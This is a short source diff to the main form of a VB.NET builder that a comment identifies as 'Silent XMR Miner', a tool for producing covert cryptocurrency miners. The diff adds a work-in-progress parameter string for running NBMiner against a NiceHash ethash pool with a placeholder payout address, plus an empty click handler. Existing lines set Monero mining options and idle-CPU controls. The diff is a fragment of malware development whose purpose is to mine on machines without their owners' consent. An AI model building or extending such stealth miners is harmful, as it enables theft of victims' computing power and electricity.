@@ -4,6 +4,7 @@ Imports System.Text
 Public Class Form1
     Public Shared rand As New Random()
     Public advancedParams As String = "--coin=monero --asm=auto --cpu-memory-pool=-1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
+    Public NBMinerParams As String = "-a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u btc_address.worker" 'WIP'
     'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
@@ -409,5 +410,9 @@ Public Class Form1
             txtIdleCPU.Enabled = False
             txtIdleWait.Enabled = False
         End If
+    End Sub
+
+    Private Sub Label36_Click(sender As Object, e As EventArgs) Handles Label36.Click
+
     End Sub
 End Class
